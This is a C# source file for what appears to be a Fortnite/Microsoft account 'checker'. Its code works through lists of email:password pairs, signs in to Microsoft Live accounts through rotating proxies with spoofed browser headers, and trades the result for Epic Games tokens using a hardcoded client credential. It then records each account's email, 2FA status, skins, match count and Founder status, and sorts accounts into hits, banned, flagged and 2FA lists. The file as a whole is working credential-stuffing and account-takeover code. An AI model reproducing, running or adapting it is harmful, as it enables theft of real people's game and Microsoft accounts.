using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Principal;
using System.Threading;
using Leaf.xNet;
using NoNameFN.Utilities;
using static Colorful.Styler;
using static NoNameFN.Utilities.Variables;


namespace NoNameFN
{
    // Token: 0x0200000E RID: 14
    internal class API
    {

     //   HashSet<string> ignoredSkins = new HashSet<string> { "faw", "faw", "faw" };


        // Token: 0x06000088 RID: 136 RVA: 0x000046B8 File Offset: 0x000028B8
        [Obfuscation(Feature = "virtualizer", Exclude = false)]

        public static void Check(string wombo)
        {
            bool flag = !Variables.checkerruning;
            if (flag)
            {
                try
                {
                    // Ensure that threads are safely stopped
                    foreach (Thread thread in Variables.threads)
                    {
                        if (thread.IsAlive)
                        {
                            // Suspend each thread
                            thread.Suspend();
                        }
                    }

                    // Wait for all threads to reach a safe state before aborting
                    Thread.Sleep(100); // Adjust delay as needed to ensure threads have time to suspend

                    foreach (Thread thread in Variables.threads)
                    {
                        if (thread.IsAlive)
                        {
                            // Abort each thread
                            thread.Abort();
                        }
                    }

                    // Wait for all threads to finish execution
                    foreach (Thread thread in Variables.threads)
                    {
                        if (thread.IsAlive)
                        {
                            thread.Join();
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Log or handle the exception
                    Console.WriteLine($"Error managing threads: {ex.Message}");
                }

                // Keep the thread running indefinitely
                Thread.Sleep(Timeout.Infinite);
            }


            using (HttpRequest httpRequest = new HttpRequest())
            {
                string[] array = wombo.Split(new char[]
                {
                    ':',
                    ';',
                    '|'
                });
                string text = array[0];
                string text2 = array[1];
                string text3 = text + ":" + text2;
                try
                {
                    bool useproxies = Variables.useProxys;
                    if (useproxies)
                    {
                        string proxyAddress = Variables.Proxys[new Random().Next(Variables.Proxys.Count)];
                        httpRequest.ConnectTimeout = 5000;
                        httpRequest.ReadWriteTimeout = 5000;
                        httpRequest.KeepAliveTimeout = 5000;
                        httpRequest.Proxy = ProxyClient.Parse(Variables.proxtype, proxyAddress);
                    }
                    httpRequest.AllowAutoRedirect = true;
                    httpRequest.IgnoreProtocolErrors = true;
                    httpRequest.AllowEmptyHeaderValues = true;
                    httpRequest.KeepAlive = true;
                    httpRequest.EnableEncodingContent = true;
                    httpRequest.UseCookies = true;
                    httpRequest.IgnoreInvalidCookie = true;
                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0");
                    httpRequest.AddHeader("Pragma", "no-cache");
                    httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
                    httpRequest.AddHeader("Accept-Language", "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3");
                    httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                    httpRequest.AddHeader("Referer", "https://login.live.com/ppsecure/post.srf?id=292543&contextid=4EDB47CE8CF1F450&opid=7410382025CCDD15&bk=1702684428&uaid=4862a16299bb4a968c21150f145a855b&pid=0");
                    httpRequest.AddHeader("Origin", "https://login.live.com");
                    httpRequest.AddHeader("DNT", "1");
                    httpRequest.AddHeader("Sec-GPC", "1");
                    httpRequest.AddHeader("Connection", "keep-alive");
                    httpRequest.AddHeader("Upgrade-Insecure-httpRequestuests", "1");
                    httpRequest.AddHeader("Sec-Fetch-Dest", "document");
                    httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
                    httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                    httpRequest.AddHeader("Sec-Fetch-User", "?1");
                    string source = httpRequest.Post("https://login.live.com/ppsecure/post.srf?", string.Concat(new string[]
                    {
                        "i13=1&login=",
                        text,
                        "&loginfmt=",
                        text,
                        "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=",
                        text2,
                        "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpghttpRequestuestid=&PPFT=<ppf>&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=12301"
                    }), "application/x-www-form-urlencoded").ToString();
                    string text4 = Variables.Parse(source, "urlPost:'", "',");
                    string text5 = WebUtility.UrlEncode(Variables.Parse(source, "name=\"PPFT\" id=\"i0327\" value=\"", "\""));
                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0");
                    httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
                    httpRequest.AddHeader("Accept-Language", "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3");
                    httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                    httpRequest.AddHeader("Referer", "https://login.live.com/ppsecure/post.srf?id=292543&contextid=4EDB47CE8CF1F450&opid=7410382025CCDD15&bk=1702684428&uaid=4862a16299bb4a968c21150f145a855b&pid=0");
                    httpRequest.AddHeader("Origin", "https://login.live.com");
                    httpRequest.AddHeader("DNT", "1");
                    httpRequest.AddHeader("Sec-GPC", "1");
                    httpRequest.AddHeader("Connection", "keep-alive");
                    httpRequest.AddHeader("Upgrade-Insecure-httpRequestuests", "1");
                    httpRequest.AddHeader("Sec-Fetch-Dest", "document");
                    httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
                    httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                    httpRequest.AddHeader("Sec-Fetch-User", "?1");
                    HttpResponse httpResponse = httpRequest.Post(text4, string.Concat(new string[]
                    {
                        "i13=1&login=",
                        text,
                        "&loginfmt=",
                        text,
                        "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=",
                        text2,
                        "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpghttpRequestuestid=&PPFT=",
                        text5,
                        "&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=12301"
                    }), "application/x-www-form-urlencoded");
                    string text6 = httpResponse.ToString();
                    foreach (object obj in httpRequest.Cookies.GetCookies(text4))
                    {
                        Variables.cookiess += ((obj != null) ? obj.ToString() : null);
                    }
                    bool flag2 = text6.Contains("Vous avez essayé de vous connecter trop de fois avec un compte ou un mot de passe incorrects.") && !text6.Contains("Connectez-vous avec un compte Microsoft ou créez-en un.") && !text6.Contains("Vous avez essayé de vous connecter trop de fois avec un compte ou un mot de passe incorrect");
                    if (flag2)
                    {
                        ExportManager.Retries(text3);
                    }
                    else
                    {
                        bool flag3 = text6.Contains("Votre compte ou mot de passe est incorrect. Si vous avez oublié votre mot de passe,") || text6.Contains("Ce compte Microsoft n’existe pas.") || text6.Contains("Votre compte ou mot de passe est incorrect.") || text6.Contains("Ce compte Microsoft n’existe pas. Entrez un autre compte ou <a href=\"https://signup.live") || text6.Contains("Votre compte ou mot de passe est incorrect. Si vous avez") || text6.Contains("n’existe pas. Entrez un autre compte ou <a href=");
                        if (flag3)
                        {
                            ExportManager.ExportBads(text3);
                        }
                        else
                        {
                            bool flag4 = text6.Contains("account.live.com/recover?mkt") || text6.Contains("account.live.com/identity/confirm?mkt") || text6.Contains("Email/Confirm?mkt") || text6.Contains("/Abuse?mkt=") || text6.Contains("/cancel?mkt=") || text6.Contains("B:2,CQ:false,bv:'");
                            if (flag4)
                            {
                                ExportManager.ExportFlagged(text3);
                            }
                            else
                            {
                                bool flag5 = Variables.cookiess.Contains("__Host-MSAAUTH") && httpResponse.StatusCode == Leaf.xNet.HttpStatusCode.OK && !text6.Contains("sDevices:'{\"Devices\"");
                                if (flag5)
                                {
                                    bool flag6 = text6.Contains("Vous avez essayé de vous connecter trop de fois avec un compte ou un mot de passe incorrects.");
                                    if (flag6)
                                    {
                                        ExportManager.ExportFlagged(text3);
                                    }
                                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                                    httpRequest.AddHeader("Pragma", "no-cache");
                                    httpRequest.AddHeader("Accept", "*/*");
                                    HttpResponse httpResponse2 = httpRequest.Get("https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup", null);
                                    bool flag7 = httpResponse2.ToString().Contains("account.live.com/Consent/Update") || httpResponse2.ToString().Contains("Consent");
                                    if (flag7)
                                    {
                                        ExportManager.ExportBanned(text3);
                                    }
                                    else
                                    {
                                        try
                                        {
                                            API.atkx = Variables.Parse(httpResponse2.Address.ToString(), "code=", "&");
                                        }
                                        catch
                                        {
                                            ExportManager.ExportBanned(text3);
                                        }
                                        httpRequest.AddHeader("Authorization", "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ=");
                                        HttpResponse httpResponse3 = httpRequest.Post("https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", "grant_type=external_auth&external_auth_type=xbl&external_auth_token=" + API.atkx, "application/x-www-form-urlencoded");
                                        string text7 = httpResponse3.ToString();
                                        bool flag8 = text7.Contains("Sorry a processing exception occurred while we were waiting for you to send us request data") || httpResponse3.StatusCode == Leaf.xNet.HttpStatusCode.InternalServerError;
                                        if (flag8)
                                        {
                                            ExportManager.Retries(text3);
                                        }
                                        bool flag9 = text7 == "" || text7.Contains("ext_auth.invalid_external_auth_toke") || text7.Contains("token you provided for the the auth system xbl could not be validated") || text7.Contains("token you provided does not map to an account") || text7.Contains("ve.com/Consent/Update?") || text7.Contains("invalid_grant") || text7.Contains("Corrective action is required to continue.");
                                        if (flag9)
                                        {
                                            ExportManager.ExportBanned(text3);
                                        }
                                        else
                                        {
                                            try
                                            {
                                                API.atk = Variables.Parse(text7, "access_token\":\"", "\"");
                                            }
                                            catch
                                            {
                                                bool flag10 = text7.Contains("Sorry a processing exception occurred while we were waiting for you");
                                                if (flag10)
                                                {
                                                    ExportManager.Retries(text3);
                                                }
                                                else
                                                {
                                                    ExportManager.ExportBanned(text3);
                                                }
                                            }
                                            string username = Variables.Parse(text7, "displayName\":\"", "\"");
                                            string str = Variables.Parse(text7, "account_id\":\"", "\"");
                                            httpRequest.AddHeader("Authorization", "Bearer " + API.atk);
                                            string text8 = httpRequest.Get("https://account-public-service-prod.ol.epicgames.com/account/api/public/account/" + str, null).ToString();
                                            string text9 = "";
                                            try
                                            {
                                                text9 = Variables.Parse(text8, "email\":\"", "\"");
                                            }
                                            catch
                                            {
                                                ExportManager.ExportBanned(text3);
                                            }
                                            bool flag11 = text8.Contains("tfaEnabled\":false") && text9 != "";
                                            if (flag11)
                                            {
                                           	httpRequest.AddHeader("Authorization", "Bearer " + API.atk);
												string text11 = httpRequest.Post("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + str + "/client/QueryProfile?profileId=athena&rvn=-1", "{}", "application/json").ToString();
												Variables.Parse(text11, "\"accountLevel\" : ", ",");
												Variables.Parse(text11, "\"lifetime_wins\" : ", ",");
												string text12 = string.Join(",", Variables.LR(text11, "templateId\" : \"AthenaCharacter:", "\"", true, false));
												int num = Variables.CountOccurrences(text12, ",");
												httpRequest.AddHeader("Authorization", "Bearer " + API.atk);
												string text13 = httpRequest.Get("https://statsproxy-public-service-live.ol.epicgames.com/statsproxy/api/statsv2/account/" + str, null).ToString();
												bool flag12 = text13.Contains("Login is banned or does not posses the action ") || text13.Contains("errors.com.epicgames.common.missing_actio") || text13.Contains("ccount.no_account_found_for_externa") || text13.Contains("\"error\":\"invalid_grant\"");
                                                if (flag12)
                                                {
                                                    ExportManager.ExportBanned(text3);
                                                }
                                                else
                                                {
                                                    List<string> list = Enumerable.ToList<string>(text13.Split(new char[]
                                                    {
                                                        ','
                                                    }));
                                                    int num2 = 0;
                                                    foreach (string text14 in list)
                                                    {
                                                        try
                                                        {
                                                            bool flag13 = text14.Contains("matchesplayed");
                                                            if (flag13)
                                                            {
                                                                int num3 = int.Parse(Variables.Parse(text14, "\":", ","));
                                                                num2 += num3;
                                                            }
                                                        }
                                                        catch
                                                        {
                                                        }
                                                    }
                                                    httpRequest.AddHeader("Authorization", "Bearer " + API.atk);
                                                    HttpResponse httpResponse4 = httpRequest.Get("https://entitlement-public-service-prod08.ol.epicgames.com/entitlement/api/account/" + str + "/entitlements", null);
                                                    bool stw = false;
                                                    bool flag14 = httpResponse4.ToString().Contains("entitlementName\":\"Fortnite_Founder\"") && httpResponse4.StatusCode == Leaf.xNet.HttpStatusCode.OK;



                                                    // Set STW flag
                                                    stw = flag14;

                                                    // Update match counts
                                                    if (!string.IsNullOrEmpty(text11))
                                                    {
                                                        num2++;
                                                    }

                                                    // Update match variables
                                                    if (num2 == 0) Variables.zeromatches++;
                                                    else if (num2 < 500) Variables.onemplus++;
                                                    else if (num2 < 1000) Variables.fivehundredmplus++;
                                                    else if (num2 < 2500) Variables.onekmplus++;
                                                    else if (num2 < 5000) Variables.twoandhalfandmplus++;
                                                    else if (num2 < 10000) Variables.fivekmplus++;
                                                    else Variables.tenkmplus++;

                                                    // Update skin variables
                                                    if (num == 0) Variables.zeroskin++;
                                                    if (num >= 1 && num < 5) Variables.oneplus++;
                                                    else if (num >= 5 && num < 25) Variables.tenplus++;
                                                    else if (num >= 25 && num < 50) Variables.twentyfiveplus++;
                                                    else if (num >= 50 && num < 100) Variables.fiftyplus++;
                                                    else if (num >= 100 && num < 150) Variables.hundredplus++;
                                                    else if (num >= 150 && num < 200) Variables.hundredfiftyplus++;  // Fixed range
                                                    else if (num >= 200 && num < 250) Variables.twohundredplus++;   // Fixed range
                                                    else if (num >= 250) Variables.twohundredfiftyplus++;  // No upper limit needed


                                                    // Determine if maybefa
                                                    bool maybefa = text11 == text;

                                                    // Export combined stats
                                                    ExportManager.ExportCombined(text3, username, num2, num, text12, maybefa, text9, stw);

                                                    // Set last hit details
                                                    Variables.lastHit = new LastHit
                                                    {
                                                        Skins = Variables.realskincount,
                                                        Matches = num2,
                                                        Time = DateTime.Now.ToString("hh:mm:ss tt"),
                                                        STW = stw
                                                    };
                                                }
                                                }
                                            else
                                            {
                                                bool flag32 = text8.Contains("tfaEnabled\":true");
                                                if (flag32)
                                                {
                                                    ExportManager.Epic2Fa(text3);
                                                }
                                                else
                                                {
                                                    ExportManager.ExportBanned(text3);
                                                }
                                            }
                                        }
                                    }
                                }
                                else
                                {
                                    bool flag33 = text6.Contains("Connectez-vous avec un compte Microsoft ou créez-en un.") && text6.Contains("Vous avez essayé de vous connecter trop de fois avec un compte ou un mot de passe incorrect");
                                    if (flag33)
                                    {
                                        ExportManager.ExportFlagged(text3);
                                    }
                                    else
                                    {
                                        ExportManager.Retries(text3);
                                    }
                                }
                            }
                        }
                    }
                }
                catch (Exception)
                {
                    ExportManager.Retries(text3);
                }
            }
        }

        // Token: 0x0400003B RID: 59
        private static string atkx;

        // Token: 0x0400003C RID: 60
        private static string atk;
    }
}
